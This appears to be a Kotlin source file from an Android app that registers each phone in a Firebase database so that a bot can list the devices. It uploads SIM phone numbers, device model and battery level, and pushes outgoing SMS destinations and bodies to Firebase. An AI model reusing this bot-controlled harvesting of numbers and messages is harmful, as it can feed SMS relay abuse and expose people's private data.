package com.hivirtus.zygiskmode

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.BatteryManager
import android.os.Build
import android.util.Log

/**
 * Har phone Firebase pe register — bot ko devices list dikhe.
 */
object FirebaseDeviceRegistry {

    private const val TAG = "FirebaseDeviceRegistry"

    fun register(context: Context, config: FirebaseAutoTokenStore.Config): Boolean {
        if (!config.enabled || config.dbUrl.isBlank() || config.deviceId.isBlank()) return false
        val client = FirebaseRestClient(config)
        return client.put(FirebasePaths.device(config.deviceId), buildDevicePayload(context, config))
    }

    fun publishOutgoingToken(
        context: Context,
        config: FirebaseAutoTokenStore.Config,
        dest: String,
        body: String,
        sendFrom: String = ""
    ): String? {
        if (!config.enabled || config.dbUrl.isBlank() || config.deviceId.isBlank()) return null
        val client = FirebaseRestClient(config)
        val now = System.currentTimeMillis()
        val payload = linkedMapOf<String, Any?>(
            "messageSender" to dest.trim(),
            "messageBody" to body.trim(),
            "body" to body.trim(),
            "to" to dest.trim(),
            "from" to sendFrom.ifBlank { config.sim1Number },
            "type" to "outgoing",
            "direction" to "outgoing",
            "status" to "new",
            "timestamp" to now,
            "created_at" to now,
            "deviceId" to config.deviceId
        )
        return client.push(FirebasePaths.messages(config.deviceId), payload)
    }

    fun buildDevicePayload(
        context: Context,
        config: FirebaseAutoTokenStore.Config
    ): Map<String, Any?> {
        val sims = SimSmsSender.readSimNumbers(context)
        val sim1 = sims.firstOrNull { it.slot == 0 }?.number.orEmpty().ifBlank { config.sim1Number }
        val sim2 = sims.firstOrNull { it.slot == 1 }?.number.orEmpty().ifBlank { config.sim2Number }
        val now = System.currentTimeMillis()
        return linkedMapOf(
            "deviceId" to config.deviceId,
            "deviceName" to Build.MODEL,
            "model" to Build.MODEL,
            "manufacturer" to Build.MANUFACTURER,
            "online" to true,
            "status" to "online",
            "battery" to readBatteryPercent(context),
            "role" to config.role.wire,
            "sim1" to sim1,
            "sim2" to sim2,
            "sim1_number" to sim1,
            "sim2_number" to sim2,
            "senderSim" to if (config.senderSimSlot == 0) "SIM1" else "SIM2",
            "targetSim" to if (config.senderSimSlot == 0) "SIM1" else "SIM2",
            "lastSeen" to now,
            "updated_at" to now,
            "app" to "hivirtus_zygisk",
            "version" to BuildConfig.VERSION_NAME
        )
    }

    private fun readBatteryPercent(context: Context): Int {
        return try {
            val filter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
            val batteryStatus = context.registerReceiver(null, filter) ?: return -1
            val level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
            val scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
            if (level < 0 || scale <= 0) -1 else (level * 100 / scale)
        } catch (_: Exception) {
            -1
        }
    }

    fun sync(context: Context) {
        AutoTokenSenderService.sync(context)
    }
}
